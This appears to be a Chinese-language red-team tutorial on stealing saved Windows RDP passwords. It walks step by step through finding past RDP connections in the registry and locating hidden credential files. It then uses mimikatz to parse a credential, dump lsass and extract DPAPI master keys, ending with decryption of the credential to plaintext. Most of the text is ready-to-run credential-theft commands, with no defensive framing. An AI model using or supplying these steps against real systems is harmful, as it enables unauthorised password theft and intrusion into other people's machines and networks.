* * *

  
当我们通过rdp服务登录远程桌面时，如果我们选择了保存凭证  
![](../Images/0b39f43ccdf6eb75098c62cd8439c29a.png)会在本地生成一个凭证文件，我们只要破解这个凭证里面的数据即可获得明文密码  
首先查看注册表查找有没有历史RDP记录

*   

```
`reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s`
```

![](../Images/6bf6ce54475f483428f97fd5e3d84229.png)这里可以看到登录某主机对应的ip、凭证名和用户名  
  
去目录下查找凭证，Windows保存RDP凭据的目录是

*   

```
`C:\Users\用户名\AppData\Local\Microsoft\Credentials`
```

![](../Images/33e4bcbfddf2377b893fdd366838704e.png)

*   

```
`dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*`
```

![](../Images/a4882fbfc6a28f30ed8cad34e480020f.png)这里如果是桌面去查找，要开启显示隐藏文件  
推荐使用离线方式，将上面凭证文件下载下来  
在本地使用mimikzte加载该凭证，里面有guidMasterKey和pbData两个值是重点

*   

```
`mimikatz # dpapi::cred /in:C:\users\admin\desktop\123\FA8654DBDA31F5DA3DA2EE53F0372F46`
```

![](../Images/efa0f20126b77953e5bd43358682b09d.png)guidMasterKey是凭据的GUID，pbData是凭据的加密数据  
而我们解密所需要的秘钥的值则保存在lsass进程中  
随便使用啥方式dump出lsass.exe进程![](../Images/bf76b9518a4370af86893ab9c2617379.png)同样离线方式使用mimikatz加载dmp文件  
利用凭证获得的guidMasterKey值查找对应的masterkey值

*   
*   

```
`mimikatz# sekurlsa::minidump lsass.dmp``mimikatz# sekurlsa::dpapi`
```

![](../Images/8a14c75fe4d19279316e81978d58e4d5.png)masterkey则就是我们所需要加密凭据的密钥  
  
最后通过mimikzte使用masterkey破解该凭证即可获得明文密码

*   

```
`mimikatz# dpapi::cred /in:C:\users\admin\desktop\123\FA8654DBDA31F5DA3DA2EE53F0372F46 /masterkey:6983ce8378095b4bc86a1fbf353e14a61edd5615012b9192a59d11077d425bea83df3515022395fecb8bffa98ea82fc8db2011d06fa5ba61f74c8fd869c4f23a`
```
